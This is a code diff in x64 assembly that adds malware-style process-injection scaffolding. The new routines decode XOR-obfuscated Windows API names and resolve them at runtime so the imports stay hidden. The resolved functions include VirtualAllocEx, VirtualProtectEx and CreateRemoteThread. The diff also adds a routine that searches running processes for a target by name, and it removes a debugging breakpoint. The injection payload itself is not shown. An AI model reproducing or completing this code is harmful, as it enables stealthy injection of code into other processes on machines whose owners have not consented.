@@ -775,7 +775,6 @@ get_proc_address_by_name:
 
     mov [rbp - 328], rax        ; library addr
 
-int3
     sub rsp, 32
     mov rcx, [rbp - 320]
     call strlen                 ; strlen in rax
@@ -796,6 +795,240 @@ int3
     add rsp, 336                ; free local variable space
 
     mov rax, [rbp - 8]          ; return value
+
+    leave
+    ret
+
+; arg0: base addr               rcx
+; arg1: xor str                 rdx
+; arg2: xor str len             r8
+;
+; return: proc addr             rax
+unxor_and_get_proc_addr:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx         ; base addr
+    mov [rbp + 24], rdx         ; xor str
+    mov [rbp + 32], r8          ; xor str len
+
+    ; [rbp - 8] = return value
+    ; 8 bytes padding
+    sub rsp, 16                 ; allocate local variable space
+
+    sub rsp, 32
+    mov rcx, [rbp + 24]
+    mov rdx, [rbp + 32]
+    mov r8, xor_key
+    mov r9, xor_key.len
+    call my_xor
+    add rsp, 32
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, [rbp + 24]
+    mov r8, [rbp + 32]
+    call get_proc_address_by_name
+    add rsp, 32
+
+    mov [rbp - 8], rax          ; proc addr
+
+    add rsp, 16                 ; free local variable space
+
+.shutdown:
+    mov rax, [rbp - 8]          ; return value
+
+    leave
+    ret
+
+; arg0: kernel base addr           rcx
+populate_kernel_function_ptrs_by_name:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx                     ; kernel base addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, loadlibrary_xor
+    mov r8, loadlibrary_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [loadlibrary_addr], rax             ; LoadLibraryA addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, open_process_xor
+    mov r8, open_process_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [open_process_addr], rax            ; OpenProcess addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, virtual_alloc_ex_xor
+    mov r8, virtual_alloc_ex_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [virtual_alloc_ex_addr], rax        ; VirtualAllocEx addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, virtual_protect_ex_xor
+    mov r8, virtual_protect_ex_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [virtual_protect_ex_addr], rax      ; VirtualProtectEx addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, create_remote_thread_xor
+    mov r8, create_remote_thread_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [create_remote_thread_addr], rax    ; CreateRemoteThread addr
+     
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, wait_for_single_object_xor
+    mov r8, wait_for_single_object_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [wait_for_single_object_addr], rax  ; WaitForSingleObject addr
+ 
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, close_handle_xor
+    mov r8, close_handle_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [close_handle_addr], rax            ; CloseHandle addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, create_toolhelp32_snapshot_xor
+    mov r8, create_toolhelp32_snapshot_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [create_toolhelp32_snapshot_addr], rax            ; CreateToolhelp32Snapshot addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, process32_first_xor
+    mov r8, process32_first_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [process32_first_addr], rax            ; Process32First addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, process32_next_xor
+    mov r8, process32_next_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [process32_next_addr], rax          ;  Process32Next addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, sleep_xor
+    mov r8, sleep_xor.len
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [sleep_addr], rax                   ; Sleep addr
+
+.shutdown:
+    leave
+    ret
+
+; arg0: proc name       rcx
+; arg1: proc name len   rdx
+;
+; return: proc id       rax
+find_target_process_id:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx                     ; proc name
+    mov [rbp + 24], rdx                     ; proc name len
+
+    ; [rbp - 8] = return value
+    ; [rbp - 16] = snapshot handle
+    ; [rbp - 580] = process entry struct
+    ; 12 bytes padding
+    sub rsp, 592                            ; allocate local variable space
+
+    mov qword [rbp - 8], 0                  ; return value
+
+    sub rsp, 32
+    mov rcx, TH32CS_SNAPPROCESS
+    xor rdx, rdx
+    call [create_toolhelp32_snapshot_addr]  ; snapshot handle
+    add rsp, 32
+
+    cmp rax, INVALID_HANDLE_VALUE
+    je .shutdown
+
+    mov [rbp - 16], rax                     ; snapshot handle
+    mov dword [rbp - 580], 564              ; processentry32.dwsize
+
+    sub rsp, 32
+    mov rcx, [rbp - 16]                     ; snapshot handle
+    mov rdx, rbp
+    sub rdx, 580                            ; &processentry 
+    call [process32_first_addr]
+    add rsp, 32
+
+    cmp rax, 0                              ; if !process32First
+    je .shutdown
+
+.loop:
+    sub rsp, 32
+    mov rcx, [rbp - 16]                     ; snapshot handle
+    mov rdx, rbp
+    sub rdx, 580                            ; &processentry 
+    call [process32_next_addr]
+    add rsp, 32
+
+    cmp rax, 0
+    je .loop_end
+        sub rsp, 32
+        mov rcx, [rbp + 16]
+        mov rdx, [rbp + 24]
+        mov r8, rbp
+        sub r8, 580
+        add r8, 44
+        call strcmpiAA
+        add rsp, 32
+
+        cmp rax, 1                          ; are strings equal
+        je .process_found        
+
+        jmp .loop
+
+.process_found:
+    mov rbx, rbp
+    sub rbx, 580
+    add rbx, 8 
+
+    mov ebx, [rbx]
+    mov [rbp - 8], rbx                      ; return value
+.loop_end:
+
+.shutdown:
+    add rsp, 592                            ; free local variable space
+
+    mov rax, [rbp - 8]
 
     leave
     ret
